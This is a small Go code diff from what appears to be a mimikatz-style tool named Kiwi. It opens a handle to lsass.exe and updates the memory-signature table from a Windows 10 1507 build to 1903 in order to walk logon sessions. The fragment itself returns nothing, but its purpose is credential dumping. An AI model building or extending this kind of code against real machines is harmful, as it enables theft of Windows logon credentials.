@@ -99,8 +99,8 @@ func (kiwi *Kiwi) GetAllCredential() ([]*Credential, error) {
 	}
 	defer api.CloseHandle(pHandle)
 	kiwi.logf(logger.Info, "process handle of lsass.exe is 0x%X", pHandle)
-	patch := lsaSrvX64References[buildWin10v1507]
-	kiwi.getSessionList(pHandle, patch)
+	patch := lsaSrvX64References[buildWin10v1903]
+	kiwi.getLogonSessionList(pHandle, patch)
 
 	// _ = kiwi.searchMemory(pHandle, module.address, module.size)
 	return nil, nil
